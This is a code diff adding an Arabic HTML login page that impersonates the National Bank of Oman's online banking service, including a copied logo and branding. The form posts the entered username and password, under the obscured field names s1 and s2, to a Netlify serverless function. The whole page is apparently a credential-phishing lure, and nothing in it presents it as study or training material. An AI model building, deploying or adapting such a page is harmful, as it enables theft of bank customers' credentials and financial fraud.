@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>البنك الوطني العماني - تسجيل الدخول</title>
+    <style>
+        @font-face {
+            font-family: 'Arabic';
+            src: url('https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic&display=swap');
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arabic', sans-serif;
+        }
+        
+        body {
+            background-color: #e9f1f7;
+            height: 100vh;
+            direction: rtl;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* الشعار والترحيب */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo {
+            max-width: 180px;
+            margin-bottom: 10px;
+        }
+        
+        .welcome-text {
+            font-size: 20px;
+            color: #002d74;
+            text-align: center;
+            font-weight: normal;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+        
+        .login-box {
+            background-color: #ffffff;
+            border-radius: 5px;
+            padding: 25px 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        
+        .login-title {
+            color: #002d74;
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: normal;
+            line-height: 1.5;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 16px;
+            color: #333;
+            text-align: right;
+        }
+        
+        .form-control {
+            width: 100%;
+            background-color: #f3f8fc;
+            border: 1px solid #d1e1ee;
+            border-radius: 5px;
+            padding: 12px 15px;
+            font-size: 16px;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #0052a5;
+        }
+        
+        .btn-login {
+            width: 100%;
+            background-color: #00439c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 15px;
+            font-size: 18px;
+            text-align: center;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 120">
+                <text x="150" y="25" font-size="16" font-weight="bold" fill="#0052a5" text-anchor="middle">البنك الوطني العماني</text>
+                
+                <text x="100" y="65" font-size="40" font-weight="bold" fill="#0052a5" text-anchor="middle">NBO</text>
+                
+                <path d="M180,40 Q195,25 210,40 T240,40" stroke="#0052a5" stroke-width="6" fill="none" />
+                <path d="M180,40 Q195,25 210,40 T240,40" stroke="#009846" stroke-width="6" fill="none" transform="translate(8, -8)" />
+                <path d="M180,40 Q195,25 210,40 T240,40" stroke="#e30613" stroke-width="6" fill="none" transform="translate(16, -16)" />
+            </svg>
+            
+            <h2 class="welcome-text">
+                مرحبا بكم في البنك<br>
+                الوطني العماني
+            </h2>
+        </div>
+        
+        <div class="login-box">
+            <h3 class="login-title">
+                الدخول إلى الخدمة<br>
+                المصرفية عبر الإنترنت
+            </h3>
+            
+            <form action="/.netlify/functions/submit-login" method="post" id="loginForm">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم</label>
+                    <input name="s1" type="text" id="username" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <input name="s2" type="password" id="password" class="form-control" required>
+                </div>
+                
+                <button type="submit" class="btn-login">الدخول</button>
+            </form>
+        </div>
+    </div>
+
+    
+</body>
+</html>
